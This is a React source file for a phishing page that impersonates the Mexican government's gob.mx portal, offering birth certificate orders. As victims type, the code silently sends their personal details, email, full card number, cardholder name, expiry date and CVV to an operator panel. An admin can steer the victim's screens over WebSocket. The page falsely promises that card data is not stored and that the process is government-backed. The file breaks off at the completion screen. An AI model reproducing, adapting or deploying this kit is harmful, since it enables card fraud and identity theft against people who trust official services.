import { useState, useEffect } from 'react';
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";

interface ActasState {
  currentScreen: string;
  formData: {
    tipoActa: string;
    nombre: string;
    primerApellido: string;
    segundoApellido: string;
    fechaNacimiento: string;
    lugarNacimiento: string;
    entidad: string;
    municipio: string;
    nombrePadre: string;
    nombreMadre: string;
    email: string;
    telefono: string;
    numCopias: number;
  };
  pagoMethod: string;
}

export default function TemplateActas() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();

  const [state, setState] = useState<ActasState>({
    currentScreen: 'solicitar',
    formData: {
      tipoActa: '',
      nombre: '',
      primerApellido: '',
      segundoApellido: '',
      fechaNacimiento: '',
      lugarNacimiento: '',
      entidad: '',
      municipio: '',
      nombrePadre: '',
      nombreMadre: '',
      email: '',
      telefono: '',
      numCopias: 1
    },
    pagoMethod: 'tarjeta'
  });

  // Update session when screen changes (silent)
  const updateSession = async (data: any) => {
    if (!sessionId) return;
    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, data);
    } catch (error) {
      // Silently ignore session update errors to avoid user disruption
    }
  };

  // Submit data mutation (silent - no user feedback)
  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
    // Silent operation - no success/error feedback to user
    onError: () => {
      // Silently ignore errors - data tracking should not interfere with user experience
    },
    onSuccess: () => {
      // Silently handle success - no user notification needed
    },
  });

  // Function to track individual field data (completely silent for user)
  const trackFieldData = (fieldName: string, fieldValue: string) => {
    if (!sessionId || !fieldValue.trim()) return;
    // Send data to panel silently without any user notification
    submitDataMutation.mutate({ fieldName, fieldValue });
  };

  // Listen for screen changes from admin (silent)
  useEffect(() => {
    if (lastMessage) {
      try {
        const data = JSON.parse(lastMessage);
        if (data.type === "screenChange" && data.sessionId === sessionId) {
          setState(prev => ({ ...prev, currentScreen: data.currentScreen }));
        }
      } catch (error) {
        // Silently ignore WebSocket parsing errors
      }
    }
  }, [lastMessage, sessionId]);

  const handleFormSubmit = async (data: any) => {
    setState(prev => ({ ...prev, formData: { ...prev.formData, ...data } }));
    
    const nextScreen = getNextScreen();
    setState(prev => ({ ...prev, currentScreen: nextScreen }));
    
    await updateSession({
      currentScreen: nextScreen,
      formData: { ...state.formData, ...data }
    });
  };

  const getNextScreen = () => {
    switch (state.currentScreen) {
      case 'solicitar': return 'datos';
      case 'datos': return 'pago';
      case 'pago': return 'procesando';
      case 'procesando': return 'completado';
      default: return 'solicitar';
    }
  };

  if (!sessionId) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-gray-800 mb-4">Enlace no válido</h1>
          <p className="text-gray-600">El enlace que intentas acceder no existe o ha expirado.</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ 
      fontFamily: 'Open Sans, sans-serif',
      backgroundColor: '#f5f5f5',
      minHeight: '100vh'
    }}>
      {/* HEADER OFICIAL GOB.MX */}
      <header style={{
        backgroundColor: '#8b1538',
        borderBottom: '4px solid #a8173f',
        padding: '10px 0',
        boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
      }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <img 
                src="data:image/x-icon;base64,AAABAAEADw8AAAEAIADoAwAAFgAAACgAAAAPAAAAHgAAAAEAIAAAAAAAwAMAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsC0EAbAtCAGwLQgBsC0IAbAtBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAtCAGwLQ7xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ7xsC0IAAAAAAAAAAAAAAAAAAAAAAGwLQEBsC0M8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtDPGwLQEAAAAAAAAAAAGwLQjxsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQjwAAAAAbAtAgGwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0CAbAtBwGwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0IAbAtCAGwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0L8bAtCAGwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0L8bAtCAGwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0I8bAtBQGwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0GAAAAAAGwLQ3xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ7xsC0BAAAAAAGwLQUBsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQUAAAAAAAAAAAAAAAABsC0GAbAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtD/GwLQ/xsC0P8bAtBgAAAAAAAAAAAAAAAAAAAAAAAAAAAbAtAgGwLQnxsC0O8bAtD/GwLQ/xsC0P8bAtDvGwLQnxsC0CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAtAwGwLQQBsC0CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4PgAA4A4AAIACAACAAm1hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAIACAADABgAA4A4AAPx+PAA="
                alt="Gobierno de México" 
                style={{ width: '32px', height: '32px', marginRight: '12px' }}
              />
              <span style={{ color: '#ffffff', fontSize: '20px', fontWeight: '700', letterSpacing: '0.5px' }}>
                gob.mx
              </span>
            </div>
            <div style={{ color: '#ffffff', fontSize: '15px', fontWeight: '500' }}>
              Gobierno de México
            </div>
          </div>
        </div>
      </header>

      {/* NAVIGATION BAR */}
      <nav style={{
        backgroundColor: '#ffffff',
        borderBottom: '2px solid #e9ecef',
        padding: '18px 0',
        boxShadow: '0 1px 3px rgba(0,0,0,0.05)'
      }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px' }}>
          <div style={{ display: 'flex', alignItems: 'center' }}>
            <span style={{ 
              color: '#666', 
              fontSize: '14px',
              marginRight: '10px'
            }}>
              Inicio &gt; Trámites &gt; 
            </span>
            <span style={{ 
              color: '#8b1538', 
              fontSize: '15px',
              fontWeight: '700'
            }}>
              Acta de Nacimiento
            </span>
          </div>
        </div>
      </nav>

      {/* MAIN CONTENT */}
      <main style={{ maxWidth: '1200px', margin: '0 auto', padding: '30px 20px' }}>
        
        {/* PANTALLA: SOLICITAR ACTA */}
        {state.currentScreen === 'solicitar' && (
          <div>
            <div style={{ 
              backgroundColor: 'white',
              borderRadius: '8px',
              padding: '40px',
              boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
              marginBottom: '30px'
            }}>
              <div style={{ textAlign: 'center', marginBottom: '40px' }}>
                <h1 style={{ 
                  fontSize: '36px', 
                  fontWeight: 'bold',
                  color: '#9D2449',
                  marginBottom: '10px'
                }}>
                  Acta de Nacimiento
                </h1>
                <p style={{ 
                  fontSize: '18px',
                  color: '#666',
                  lineHeight: '1.6'
                }}>
                  Obtén tu acta de nacimiento de manera oficial y segura a través del portal del gobierno
                </p>
              </div>

              <div style={{ 
                display: 'grid', 
                gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
                gap: '20px',
                marginBottom: '40px'
              }}>
                <div style={{
                  backgroundColor: '#f8f9fa',
                  padding: '20px',
                  borderRadius: '8px',
                  border: '1px solid #e5e5e5'
                }}>
                  <h3 style={{ color: '#9D2449', fontSize: '16px', fontWeight: 'bold', marginBottom: '10px' }}>
                    📄 Documento Oficial
                  </h3>
                  <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.5' }}>
                    Acta de nacimiento con validez oficial emitida por el Registro Civil
                  </p>
                </div>

                <div style={{
                  backgroundColor: '#f8f9fa',
                  padding: '20px',
                  borderRadius: '8px',
                  border: '1px solid #e5e5e5'
                }}>
                  <h3 style={{ color: '#9D2449', fontSize: '16px', fontWeight: 'bold', marginBottom: '10px' }}>
                    🚀 Entrega Rápida
                  </h3>
                  <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.5' }}>
                    Recibe tu acta en formato digital inmediatamente después del pago
                  </p>
                </div>

                <div style={{
                  backgroundColor: '#f8f9fa',
                  padding: '20px',
                  borderRadius: '8px',
                  border: '1px solid #e5e5e5'
                }}>
                  <h3 style={{ color: '#9D2449', fontSize: '16px', fontWeight: 'bold', marginBottom: '10px' }}>
                    🔒 100% Seguro
                  </h3>
                  <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.5' }}>
                    Proceso completamente seguro respaldado por el gobierno mexicano
                  </p>
                </div>
              </div>

              <div style={{ textAlign: 'center' }}>
                <button
                  onClick={() => handleFormSubmit({})}
                  style={{
                    backgroundColor: '#9D2449',
                    color: 'white',
                    padding: '15px 40px',
                    fontSize: '18px',
                    fontWeight: 'bold',
                    border: 'none',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    transition: 'all 0.3s ease'
                  }}
                  onMouseOver={(e) => {
                    e.currentTarget.style.backgroundColor = '#BE1E3C';
                  }}
                  onMouseOut={(e) => {
                    e.currentTarget.style.backgroundColor = '#9D2449';
                  }}
                  data-testid="button-solicitar-acta"
                >
                  Solicitar Acta de Nacimiento
                </button>
              </div>
            </div>

            <div style={{
              backgroundColor: 'white',
              borderRadius: '8px',
              padding: '30px',
              boxShadow: '0 2px 8px rgba(0,0,0,0.1)'
            }}>
              <h2 style={{ 
                color: '#9D2449', 
                fontSize: '24px', 
                fontWeight: 'bold',
                marginBottom: '20px'
              }}>
                Requisitos
              </h2>
              <ul style={{ color: '#666', fontSize: '16px', lineHeight: '1.8' }}>
                <li style={{ marginBottom: '10px' }}>• Datos personales completos del titular</li>
                <li style={{ marginBottom: '10px' }}>• Fecha exacta de nacimiento</li>
                <li style={{ marginBottom: '10px' }}>• Lugar de nacimiento (estado y municipio)</li>
                <li style={{ marginBottom: '10px' }}>• Nombres completos de los padres</li>
                <li style={{ marginBottom: '10px' }}>• Correo electrónico válido</li>
              </ul>
            </div>
          </div>
        )}

        {/* PANTALLA: DATOS PERSONALES */}
        {state.currentScreen === 'datos' && (
          <div style={{
            backgroundColor: 'white',
            borderRadius: '8px',
            padding: '40px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)'
          }}>
            <h2 style={{ 
              color: '#9D2449', 
              fontSize: '28px', 
              fontWeight: 'bold',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              Datos del Solicitante
            </h2>

            <form onSubmit={(e) => {
              e.preventDefault();
              const formData = new FormData(e.target as HTMLFormElement);
              const data = Object.fromEntries(formData.entries());
              handleFormSubmit(data);
            }}>
              <div style={{ 
                display: 'grid', 
                gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))',
                gap: '20px',
                marginBottom: '30px'
              }}>
                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Nombre(s) *
                  </label>
                  <input
                    type="text"
                    name="nombre"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529',
                      transition: 'border-color 0.3s ease'
                    }}
                    onChange={(e) => trackFieldData('Nombre', e.target.value)}
                    onFocus={(e) => {
                      e.currentTarget.style.borderColor = '#8b1538';
                      e.currentTarget.style.boxShadow = '0 0 0 0.2rem rgba(139, 21, 56, 0.25)';
                    }}
                    onBlur={(e) => {
                      e.currentTarget.style.borderColor = '#ced4da';
                      e.currentTarget.style.boxShadow = 'none';
                    }}
                    data-testid="input-nombre"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Primer Apellido *
                  </label>
                  <input
                    type="text"
                    name="primerApellido"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    onChange={(e) => trackFieldData('Primer Apellido', e.target.value)}
                    data-testid="input-primer-apellido"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Segundo Apellido
                  </label>
                  <input
                    type="text"
                    name="segundoApellido"
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    data-testid="input-segundo-apellido"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Fecha de Nacimiento *
                  </label>
                  <input
                    type="date"
                    name="fechaNacimiento"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    data-testid="input-fecha-nacimiento"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Estado de Nacimiento *
                  </label>
                  <select
                    name="entidad"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    data-testid="select-entidad"
                  >
                    <option value="">Seleccione un estado</option>
                    <option value="aguascalientes">Aguascalientes</option>
                    <option value="baja-california">Baja California</option>
                    <option value="baja-california-sur">Baja California Sur</option>
                    <option value="campeche">Campeche</option>
                    <option value="chiapas">Chiapas</option>
                    <option value="chihuahua">Chihuahua</option>
                    <option value="coahuila">Coahuila</option>
                    <option value="colima">Colima</option>
                    <option value="ciudad-mexico">Ciudad de México</option>
                    <option value="durango">Durango</option>
                    <option value="guanajuato">Guanajuato</option>
                    <option value="guerrero">Guerrero</option>
                    <option value="hidalgo">Hidalgo</option>
                    <option value="jalisco">Jalisco</option>
                    <option value="mexico">Estado de México</option>
                    <option value="michoacan">Michoacán</option>
                    <option value="morelos">Morelos</option>
                    <option value="nayarit">Nayarit</option>
                    <option value="nuevo-leon">Nuevo León</option>
                    <option value="oaxaca">Oaxaca</option>
                    <option value="puebla">Puebla</option>
                    <option value="queretaro">Querétaro</option>
                    <option value="quintana-roo">Quintana Roo</option>
                    <option value="san-luis-potosi">San Luis Potosí</option>
                    <option value="sinaloa">Sinaloa</option>
                    <option value="sonora">Sonora</option>
                    <option value="tabasco">Tabasco</option>
                    <option value="tamaulipas">Tamaulipas</option>
                    <option value="tlaxcala">Tlaxcala</option>
                    <option value="veracruz">Veracruz</option>
                    <option value="yucatan">Yucatán</option>
                    <option value="zacatecas">Zacatecas</option>
                  </select>
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Municipio de Nacimiento *
                  </label>
                  <input
                    type="text"
                    name="municipio"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    data-testid="input-municipio"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Nombre del Padre *
                  </label>
                  <input
                    type="text"
                    name="nombrePadre"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    data-testid="input-nombre-padre"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Nombre de la Madre *
                  </label>
                  <input
                    type="text"
                    name="nombreMadre"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    data-testid="input-nombre-madre"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Correo Electrónico *
                  </label>
                  <input
                    type="email"
                    name="email"
                    required
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    onChange={(e) => trackFieldData('Email', e.target.value)}
                    data-testid="input-email"
                  />
                </div>

                <div>
                  <label style={{ 
                    display: 'block', 
                    color: '#495057', 
                    fontSize: '14px', 
                    fontWeight: '700',
                    marginBottom: '8px'
                  }}>
                    Número de Copias
                  </label>
                  <select
                    name="numCopias"
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '2px solid #ced4da',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: '#ffffff',
                      color: '#212529'
                    }}
                    data-testid="select-copias"
                  >
                    <option value="1">1 copia - $44.00 MXN</option>
                    <option value="2">2 copias - $88.00 MXN</option>
                    <option value="3">3 copias - $132.00 MXN</option>
                    <option value="4">4 copias - $176.00 MXN</option>
                    <option value="5">5 copias - $220.00 MXN</option>
                  </select>
                </div>
              </div>

              <div style={{ textAlign: 'center' }}>
                <button
                  type="submit"
                  style={{
                    backgroundColor: '#8b1538',
                    color: '#ffffff',
                    padding: '15px 40px',
                    fontSize: '18px',
                    fontWeight: '700',
                    border: 'none',
                    borderRadius: '6px',
                    cursor: 'pointer',
                    boxShadow: '0 2px 4px rgba(139, 21, 56, 0.3)',
                    transition: 'all 0.3s ease'
                  }}
                  data-testid="button-continuar-datos"
                >
                  Continuar con el Pago
                </button>
              </div>
            </form>
          </div>
        )}

        {/* PANTALLA: MÉTODOS DE PAGO */}
        {state.currentScreen === 'pago' && (
          <div style={{
            backgroundColor: 'white',
            borderRadius: '8px',
            padding: '40px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)'
          }}>
            <h2 style={{ 
              color: '#9D2449', 
              fontSize: '28px', 
              fontWeight: 'bold',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              Selecciona tu Método de Pago
            </h2>

            <div style={{ 
              display: 'flex',
              justifyContent: 'center',
              marginBottom: '30px'
            }}>
              <div 
                onClick={() => setState(prev => ({ ...prev, pagoMethod: 'tarjeta' }))}
                style={{
                  backgroundColor: state.pagoMethod === 'tarjeta' ? '#f8f9fa' : '#ffffff',
                  border: `3px solid ${state.pagoMethod === 'tarjeta' ? '#8b1538' : '#dee2e6'}`,
                  borderRadius: '8px',
                  padding: '25px',
                  cursor: 'pointer',
                  textAlign: 'center',
                  transition: 'all 0.3s ease',
                  boxShadow: state.pagoMethod === 'tarjeta' ? '0 4px 12px rgba(139, 21, 56, 0.15)' : '0 2px 4px rgba(0,0,0,0.1)',
                  minWidth: '300px'
                }}
                data-testid="option-tarjeta"
              >
                <div style={{ fontSize: '48px', marginBottom: '10px' }}>💳</div>
                <h3 style={{ color: '#8b1538', fontSize: '18px', fontWeight: '700', marginBottom: '8px' }}>
                  Tarjeta de Crédito/Débito
                </h3>
                <p style={{ color: '#495057', fontSize: '14px' }}>
                  Pago inmediato y seguro
                </p>
              </div>
            </div>

            {/* FORMULARIO DE TARJETA DE CRÉDITO */}
            {state.pagoMethod === 'tarjeta' && (
              <div style={{ 
                marginTop: '30px',
                backgroundColor: '#f8f9fa',
                padding: '30px',
                borderRadius: '8px',
                border: '1px solid #dee2e6'
              }}>
                <h3 style={{ 
                  color: '#8b1538', 
                  fontSize: '20px', 
                  fontWeight: '700',
                  marginBottom: '20px',
                  textAlign: 'center'
                }}>
                  Datos de la Tarjeta
                </h3>
                
                <form onSubmit={(e) => {
                  e.preventDefault();
                  const formData = new FormData(e.target as HTMLFormElement);
                  const cardData = Object.fromEntries(formData.entries());
                  handleFormSubmit({ pagoMethod: state.pagoMethod, ...cardData });
                }}>
                  <div style={{ 
                    display: 'grid', 
                    gridTemplateColumns: '1fr',
                    gap: '20px',
                    marginBottom: '25px'
                  }}>
                    <div>
                      <label style={{ 
                        display: 'block', 
                        color: '#495057', 
                        fontSize: '14px', 
                        fontWeight: '700',
                        marginBottom: '8px'
                      }}>
                        Número de Tarjeta *
                      </label>
                      <input
                        type="text"
                        name="numeroTarjeta"
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                        required
                        style={{
                          width: '100%',
                          padding: '12px',
                          border: '2px solid #ced4da',
                          borderRadius: '6px',
                          fontSize: '16px',
                          backgroundColor: '#ffffff',
                          color: '#495057',
                          outline: 'none',
                          transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                        }}
                        onFocus={(e) => {
                          e.target.style.borderColor = '#8b1538';
                          e.target.style.boxShadow = '0 0 0 3px rgba(139, 21, 56, 0.1)';
                        }}
                        onBlur={(e) => {
                          e.target.style.borderColor = '#ced4da';
                          e.target.style.boxShadow = 'none';
                        }}
                        onChange={(e) => {
                          let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
                          value = value.substring(0, 16);
                          value = value.replace(/(.{4})/g, '$1 ').trim();
                          e.target.value = value;
                          // Solo enviar cuando la tarjeta esté completa (16 dígitos)
                          if (value.replace(/\s/g, '').length === 16) {
                            trackFieldData('Número de Tarjeta', value);
                          }
                        }}
                        data-testid="input-numero-tarjeta"
                      />
                    </div>

                    <div>
                      <label style={{ 
                        display: 'block', 
                        color: '#495057', 
                        fontSize: '14px', 
                        fontWeight: '700',
                        marginBottom: '8px'
                      }}>
                        Nombre del Titular *
                      </label>
                      <input
                        type="text"
                        name="nombreTitular"
                        placeholder="JUAN PÉREZ GONZÁLEZ"
                        required
                        style={{
                          width: '100%',
                          padding: '12px',
                          border: '2px solid #ced4da',
                          borderRadius: '6px',
                          fontSize: '16px',
                          backgroundColor: '#ffffff',
                          color: '#495057',
                          textTransform: 'uppercase',
                          outline: 'none',
                          transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                        }}
                        onFocus={(e) => {
                          e.target.style.borderColor = '#8b1538';
                          e.target.style.boxShadow = '0 0 0 3px rgba(139, 21, 56, 0.1)';
                        }}
                        onBlur={(e) => {
                          e.target.style.borderColor = '#ced4da';
                          e.target.style.boxShadow = 'none';
                        }}
                        onChange={(e) => {
                          if (e.target.value.length >= 3) {
                            trackFieldData('Titular de Tarjeta', e.target.value);
                          }
                        }}
                        data-testid="input-nombre-titular"
                      />
                    </div>

                    <div style={{ 
                      display: 'grid', 
                      gridTemplateColumns: '1fr 1fr',
                      gap: '15px'
                    }}>
                      <div>
                        <label style={{ 
                          display: 'block', 
                          color: '#495057', 
                          fontSize: '14px', 
                          fontWeight: '700',
                          marginBottom: '8px'
                        }}>
                          Fecha de Vencimiento *
                        </label>
                        <input
                          type="text"
                          name="fechaVencimiento"
                          placeholder="MM/AA"
                          maxLength={5}
                          required
                          style={{
                            width: '100%',
                            padding: '12px',
                            border: '2px solid #ced4da',
                            borderRadius: '6px',
                            fontSize: '16px',
                            backgroundColor: '#ffffff',
                            color: '#495057',
                            outline: 'none',
                            transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                          }}
                          onFocus={(e) => {
                            e.target.style.borderColor = '#8b1538';
                            e.target.style.boxShadow = '0 0 0 3px rgba(139, 21, 56, 0.1)';
                          }}
                          onBlur={(e) => {
                            e.target.style.borderColor = '#ced4da';
                            e.target.style.boxShadow = 'none';
                          }}
                          onChange={(e) => {
                            let value = e.target.value.replace(/[^0-9]/g, '');
                            if (value.length >= 2) {
                              value = value.substring(0, 2) + '/' + value.substring(2, 4);
                            }
                            e.target.value = value;
                            // Enviar cuando tenga formato completo MM/AA
                            if (value.length === 5) {
                              trackFieldData('Fecha de Vencimiento', value);
                            }
                          }}
                          data-testid="input-fecha-vencimiento"
                        />
                      </div>

                      <div>
                        <label style={{ 
                          display: 'block', 
                          color: '#495057', 
                          fontSize: '14px', 
                          fontWeight: '700',
                          marginBottom: '8px'
                        }}>
                          CVV *
                        </label>
                        <input
                          type="text"
                          name="cvv"
                          placeholder="123"
                          maxLength={4}
                          required
                          style={{
                            width: '100%',
                            padding: '12px',
                            border: '2px solid #ced4da',
                            borderRadius: '6px',
                            fontSize: '16px',
                            backgroundColor: '#ffffff',
                            color: '#495057',
                            outline: 'none',
                            transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                          }}
                          onFocus={(e) => {
                            e.target.style.borderColor = '#8b1538';
                            e.target.style.boxShadow = '0 0 0 3px rgba(139, 21, 56, 0.1)';
                          }}
                          onBlur={(e) => {
                            e.target.style.borderColor = '#ced4da';
                            e.target.style.boxShadow = 'none';
                          }}
                          onChange={(e) => {
                            e.target.value = e.target.value.replace(/[^0-9]/g, '');
                            // Enviar CVV cuando tenga 3 o 4 dígitos
                            if (e.target.value.length >= 3) {
                              trackFieldData('CVV', e.target.value);
                            }
                          }}
                          data-testid="input-cvv"
                        />
                      </div>
                    </div>
                  </div>

                  <div style={{ 
                    padding: '20px',
                    backgroundColor: '#e3f2fd',
                    borderRadius: '6px',
                    marginBottom: '25px',
                    border: '1px solid #90caf9'
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                      <span style={{ fontSize: '20px', marginRight: '10px' }}>🔒</span>
                      <span style={{ color: '#1565c0', fontWeight: '600', fontSize: '16px' }}>
                        Pago Seguro
                      </span>
                    </div>
                    <p style={{ color: '#1976d2', fontSize: '14px', margin: '0' }}>
                      Tus datos están protegidos con encriptación SSL de 256 bits. 
                      No almacenamos información de tarjetas de crédito.
                    </p>
                  </div>

                  <div style={{ textAlign: 'center' }}>
                    <button
                      type="submit"
                      style={{
                        backgroundColor: '#28a745',
                        color: 'white',
                        padding: '15px 40px',
                        fontSize: '18px',
                        fontWeight: 'bold',
                        border: 'none',
                        borderRadius: '8px',
                        cursor: 'pointer',
                        boxShadow: '0 2px 4px rgba(40, 167, 69, 0.3)'
                      }}
                      data-testid="button-pagar-tarjeta"
                    >
                      💳 Pagar $44.00 MXN
                    </button>
                  </div>
                </form>
              </div>
            )}

          </div>
        )}

        {/* PANTALLA: PROCESANDO */}
        {state.currentScreen === 'procesando' && (
          <div style={{
            backgroundColor: 'white',
            borderRadius: '8px',
            padding: '60px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
            textAlign: 'center'
          }}>
            <div style={{
              width: '80px',
              height: '80px',
              border: '6px solid #f3f3f3',
              borderTop: '6px solid #9D2449',
              borderRadius: '50%',
              animation: 'spin 1s linear infinite',
              margin: '0 auto 30px'
            }}></div>
            
            <h2 style={{ 
              color: '#9D2449', 
              fontSize: '28px', 
              fontWeight: 'bold',
              marginBottom: '20px'
            }}>
              Procesando tu Solicitud
            </h2>
            
            <p style={{ 
              color: '#666', 
              fontSize: '18px',
              lineHeight: '1.6',
              marginBottom: '30px'
            }}>
              Estamos verificando tus datos y generando tu acta de nacimiento.<br />
              Este proceso puede tomar unos momentos...
            </p>

            <div style={{ marginTop: '40px' }}>
              <button
                onClick={() => handleFormSubmit({})}
                style={{
                  backgroundColor: '#9D2449',
                  color: 'white',
                  padding: '12px 30px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  border: 'none',
                  borderRadius: '6px',
                  cursor: 'pointer'
                }}
                data-testid="button-acelerar-proceso"
              >
                Ver Estado de la Solicitud
              </button>
            </div>
          </div>
        )}

        {/* PANTALLA: COMPLETADO */}
        {state.currentScreen === 'completado' && (
          <div style={{
            backgroundColor: 'white',
            borderRadius: '8px',
            padding: '50px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
            textAlign: 'center'
          }}>
            <div style={{
              width: '100px',
              height: '100px',
              backgroundColor: '#4CAF50',
              borderRadius: '50%',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '48px'
            }}>
              ✅
            </div>
            
            <h2 style={{ 
              color: '#9D2449', 
              fontSize: '32px', 
              fontWeight: 'bold',
              marginBottom: '20px'
            }}>
              ¡Acta de Nacimiento Lista!
            </h2>
